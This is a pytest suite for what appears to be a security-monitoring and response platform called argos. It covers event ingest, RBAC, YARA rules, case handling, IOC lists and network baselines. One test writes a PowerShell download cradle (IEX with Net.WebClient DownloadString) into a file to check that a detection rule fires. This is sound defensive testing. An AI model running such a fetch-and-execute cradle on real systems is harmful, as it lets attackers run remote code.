from __future__ import annotations

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from argos.config import Config
from argos.detection.alerts import Alert, Severity
from argos.ocsf import EventCategory, OcsfEvent
from argos.security.auth import sign_token
from argos.server import AppContext, create_app

PROJECT_ROOT = Path(__file__).resolve().parent.parent


@pytest.fixture
def client(tmp_path):
    cfg = Config()
    cfg.root = PROJECT_ROOT
    cfg.data_dir = tmp_path / "data"
    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    cfg.require_auth = False
    ctx = AppContext(cfg)
    app = create_app(cfg)
    app.state.ctx = ctx
    return TestClient(app)


def test_health(client):
    r = client.get("/api/v1/health")
    assert r.status_code == 200
    assert r.json()["status"] == "ok"


def test_ingest_and_events(client):
    ev = OcsfEvent(category=EventCategory.NETWORK, host="h1", dst_ip="9.9.9.9")
    r = client.post("/api/v1/ingest", json={"events": [ev.model_dump()]})
    assert r.status_code == 200
    assert r.json()["ingested"] == 1
    out = client.get("/api/v1/events", params={"category": "network"})
    assert len(out.json()) == 1


def test_switch_endpoint(client):
    r = client.post("/api/v1/switch", json={"level": "SUGGEST"})
    assert r.json()["level"] == "SUGGEST"


def test_propose_and_confirm(client):
    client.post("/api/v1/switch", json={"level": "SUGGEST"})
    p = client.post("/api/v1/propose", json={"action": "block_ip", "target": "1.2.3.4"})
    assert p.json()["status"] == "pending"
    cid = p.json()["id"]
    c = client.post("/api/v1/confirm", json={"id": cid, "approved_by": "analyst"})
    assert c.json()["status"] == "executed"


def test_actions_catalog(client):
    r = client.get("/api/v1/actions")
    assert len(r.json()) == 7


def test_coverage_endpoint(client):
    r = client.get("/api/v1/coverage")
    data = r.json()
    assert "matrix" in data and "total" in data and "covered" in data
    assert data["covered"] <= data["total"]
    assert "T1059" in data["matrix"]


def test_audit_immutable(client):
    client.post("/api/v1/switch", json={"level": "SUGGEST"})
    p = client.post("/api/v1/propose", json={"action": "block_ip", "target": "5.6.7.8"})
    client.post("/api/v1/confirm", json={"id": p.json()["id"], "approved_by": "analyst"})
    r = client.get("/api/v1/audit")
    assert any("block_ip" in a["action"] for a in r.json())


def test_version(client):
    r = client.get("/api/v1/version")
    assert r.status_code == 200
    assert r.json()["version"] == "0.1.0"


def test_auth_token_and_rbac(client):
    r = client.post("/api/v1/auth/token", json={"role": "admin", "ttl": 3600})
    assert r.status_code == 200
    assert "token" in r.json()
    bad = client.post("/api/v1/auth/token", json={"role": "super"})
    assert bad.status_code == 400


def test_users_crud(client):
    c = client.post("/api/v1/users", json={"username": "op1", "password": "secreto123", "role": "operator"})
    assert c.status_code == 200
    uid = c.json()["id"]
    assert c.json()["role"] == "operator"
    lst = client.get("/api/v1/users")
    assert any(u["username"] == "op1" for u in lst.json())
    upd = client.put("/api/v1/users", json={"id": uid, "role": "admin"})
    assert upd.json()["role"] == "admin"
    d = client.delete("/api/v1/users", params={"id": uid})
    assert d.status_code == 200


def test_rules_management_and_reload(client):
    c = client.post("/api/v1/rules", json={
        "name": "test_rule", "type": "yara",
        "content": "rule Test { strings: $a = \"evilpayload\" nocase; condition: $a }",
    })
    assert c.status_code == 200
    rid = c.json()["id"]
    rl = client.post("/api/v1/rules/reload")
    assert rl.status_code == 200
    assert "yara" in rl.json()
    d = client.delete("/api/v1/rules", params={"id": rid})
    assert d.status_code == 200


def test_alert_ack(client):
    ctx = client.app.state.ctx
    alert = Alert(title="Prueba", severity=Severity.HIGH, host="h9", source="sigma")
    ctx.alert_store.add(alert)
    r = client.post(f"/api/v1/alerts/{alert.id}/ack", json={})
    assert r.status_code == 200
    assert r.json()["acknowledged"] is True


def test_scan_yara(client, tmp_path):
    f = tmp_path / "cradle.ps1"
    f.write_text("IEX; $wc = New-Object Net.WebClient; $wc.DownloadString('http://x')")
    r = client.post("/api/v1/scan/yara", json={"path": str(f)})
    assert r.status_code == 200
    assert any("Suspicious_Download_Cradle" in h["rule"] for h in r.json()["hits"])


def test_processes_inventory(client):
    client.post("/api/v1/ingest", json={"events": [
        OcsfEvent(category=EventCategory.PROCESS, host="hproc",
                  process_name="malware.exe", process_pid=1234,
                  process_image="C:\\malware.exe").model_dump()]})
    r = client.get("/api/v1/processes")
    assert r.status_code == 200
    assert any(p["process_name"] == "malware.exe" for p in r.json())


def test_actions_execute_and_undo(client):
    r = client.post("/api/v1/actions/execute",
                    json={"action": "block_ip", "target": "9.9.9.9", "approved_by": "ui"})
    assert r.status_code == 200
    pid = r.json()["id"]
    u = client.post("/api/v1/actions/undo", json={"proposal_id": pid, "approved_by": "ui"})
    assert u.status_code == 200
    assert u.json()["status"] == "undone"


def test_proposal_reject(client):
    client.post("/api/v1/switch", json={"level": "SUGGEST"})
    p = client.post("/api/v1/propose", json={"action": "block_ip", "target": "4.4.4.4"})
    pid = p.json()["id"]
    r = client.post(f"/api/v1/proposals/{pid}/reject", json={"rejected_by": "analyst"})
    assert r.status_code == 200
    assert r.json()["status"] == "rejected"


def test_audit_verify(client):
    r = client.get("/api/v1/audit/verify")
    assert r.status_code == 200
    assert "chain_valid" in r.json()


def test_export(client):
    r = client.get("/api/v1/export", params={"kind": "events", "fmt": "json"})
    assert r.status_code == 200
    assert isinstance(r.json(), list)
    csv = client.get("/api/v1/export", params={"kind": "events", "fmt": "csv"})
    assert csv.status_code == 200
    assert csv.headers["content-type"].startswith("text/csv")


def test_logs_filtered(client):
    r = client.get("/api/v1/logs", params={"limit": 100})
    assert r.status_code == 200
    assert isinstance(r.json(), list)


def test_health_deep(client):
    r = client.get("/api/v1/health/deep")
    assert r.status_code == 200
    assert "engine" in r.json() and "database" in r.json()


def test_switch_audit(client):
    client.post("/api/v1/switch", json={"level": "SUGGEST"})
    r = client.get("/api/v1/switch/audit")
    assert r.status_code == 200
    assert isinstance(r.json(), list)


def test_settings_test(client):
    r = client.post("/api/v1/settings/test", json={"rate_limit_per_hour": 50})
    assert r.status_code == 200
    assert r.json()["valid"] is True


def test_rules_managed_endpoint(client):
    c = client.post("/api/v1/rules", json={
        "name": "managed_rule", "type": "yara",
        "content": "rule M { strings: $a = \"abc\"; condition: $a }",
    })
    assert c.status_code == 200
    rid = c.json()["id"]
    m = client.get("/api/v1/rules/managed")
    assert m.status_code == 200
    assert any(r["id"] == rid for r in m.json())
    d = client.delete("/api/v1/rules", params={"id": rid})
    assert d.status_code == 200


def test_rules_reload_includes_managed(client):
    c = client.post("/api/v1/rules", json={
        "name": "managed_rule2", "type": "yara",
        "content": "rule M2 { strings: $a = \"xyz\"; condition: $a }",
    })
    rid = c.json()["id"]
    rl = client.post("/api/v1/rules/reload")
    assert rl.status_code == 200
    assert rl.json()["managed"] >= 1
    client.delete("/api/v1/rules", params={"id": rid})


def test_user_toggle_enabled(client):
    c = client.post("/api/v1/users", json={"username": "tg", "password": "secreto123", "role": "operator"})
    assert c.status_code == 200
    uid = c.json()["id"]
    u = client.put("/api/v1/users", json={"id": uid, "enabled": False})
    assert u.json()["enabled"] is False
    client.delete("/api/v1/users", params={"id": uid})


def test_rbac_denies_operator(tmp_path):
    cfg = Config()
    cfg.root = PROJECT_ROOT
    cfg.data_dir = tmp_path / "data"
    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    cfg.require_auth = True
    ctx = AppContext(cfg)
    app = create_app(cfg)
    app.state.ctx = ctx
    c = TestClient(app)
    op_token = sign_token(ctx.auth_secret, "operator", sub="op")
    admin_token = sign_token(ctx.auth_secret, "admin", sub="admin")
    denied = c.get("/api/v1/users", headers={"Authorization": f"Bearer {op_token}"})
    assert denied.status_code == 403
    allowed = c.get("/api/v1/users", headers={"Authorization": f"Bearer {admin_token}"})
    assert allowed.status_code == 200


def test_scan_capabilities(client):
    r = client.get("/api/v1/scan/capabilities")
    assert r.status_code == 200
    data = r.json()
    assert "kinds" in data and "portscan" in data["kinds"]
    assert "nmap_available" in data


def test_scan_network(client):
    r = client.post("/api/v1/scan/network", json={
        "target": "127.0.0.1", "kinds": ["ping", "dns"], "timeout": 1.0,
    })
    assert r.status_code == 200
    data = r.json()
    assert data["target"] == "127.0.0.1"
    assert "results" in data
    assert "ping" in data["results"] and "dns" in data["results"]


def test_ioc_crud(client):
    indicator = "203.0.113.55"
    a = client.post("/api/v1/ioc", json={"indicator": indicator})
    assert a.status_code == 200
    lst = client.get("/api/v1/ioc")
    assert indicator in lst.json()["iocs"]
    d = client.delete("/api/v1/ioc", params={"indicator": indicator})
    assert d.status_code == 200
    lst2 = client.get("/api/v1/ioc")
    assert indicator not in lst2.json()["iocs"]


def test_cases_crud(client):
    c = client.post("/api/v1/cases", json={"title": "Phishing en FIN", "severity": "high"})
    assert c.status_code == 200
    cid = c.json()["id"]
    lst = client.get("/api/v1/cases")
    assert any(x["id"] == cid for x in lst.json())
    got = client.get(f"/api/v1/cases/{cid}")
    assert got.status_code == 200
    upd = client.put(f"/api/v1/cases/{cid}", json={"status": "closed", "assigned_to": "soc1"})
    assert upd.status_code == 200
    assert upd.json()["status"] == "closed"
    note = client.post(f"/api/v1/cases/{cid}/notes", json={"text": "Se bloqueo el remitente"})
    assert note.status_code == 200
    assert len(note.json()["notes"]) >= 1
    missing = client.get("/api/v1/cases/nope")
    assert missing.status_code == 404


def test_backup(client):
    r = client.post("/api/v1/backup", json={})
    assert r.status_code == 200
    assert "backup" in r.json()


def test_network_baseline_endpoints(client):
    target = "10.0.0.99"
    b = client.post("/api/v1/network/baseline", json={
        "target": target, "open_ports": [443], "services": {"443": "https"},
    })
    assert b.status_code == 200
    assert b.json()["host"] == target

    bl = client.get("/api/v1/network/baseline")
    assert bl.status_code == 200
    data = bl.json()
    assert any(x["host"] == target for x in data["baselines"])
    assert target in data["targets"]

    t2 = "10.0.0.100"
    add = client.post("/api/v1/network/targets", json={"target": t2})
    assert add.status_code == 200
    assert t2 in add.json()["targets"]
    rem = client.delete("/api/v1/network/targets", params={"target": t2})
    assert rem.status_code == 200

    sched = client.post("/api/v1/network/scan/schedule", json={
        "target": "127.0.0.1", "kinds": ["portscan"], "timeout": 1.0,
    })
    assert sched.status_code == 200
    assert "scan" in sched.json() and "diff" in sched.json()


def test_network_baseline_store(tmp_path):
    from argos.config import Config
    from argos.storage.network_baseline import NetworkBaselineStore

    cfg = Config()
    cfg.root = PROJECT_ROOT
    cfg.data_dir = tmp_path / "data"
    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    store = NetworkBaselineStore(cfg)

    # First scan initializes baseline (no diff).
    d0 = store.record_scan("h1", [80, 443], {"80": "http", "443": "https"})
    assert d0["baseline_state"] == "initialized"

    # Second scan with a new port must be detected.
    d1 = store.record_scan("h1", [80, 443, 8080], {"80": "http", "443": "https", "8080": "http-alt"})
    assert 8080 in d1["new_ports"]

    # Stable scan with same ports yields no new ports.
    d2 = store.record_scan("h1", [80, 443, 8080], {"80": "http", "443": "https", "8080": "http-alt"})
    assert d2["new_ports"] == [] and d2["closed_ports"] == []

    # External connection detection.
    d3 = store.record_scan(
        "h1", [80, 443, 8080], {"80": "http", "443": "https", "8080": "http-alt"},
        external_conns=[{"protocol": "tcp", "remote_addr": "8.8.8.8", "remote_port": 443,
                        "local_addr": "10.0.0.1", "local_port": 5000, "state": "ESTABLISHED"}],
    )
    assert any(c.get("remote_addr") == "8.8.8.8" for c in d3["new_connections"])
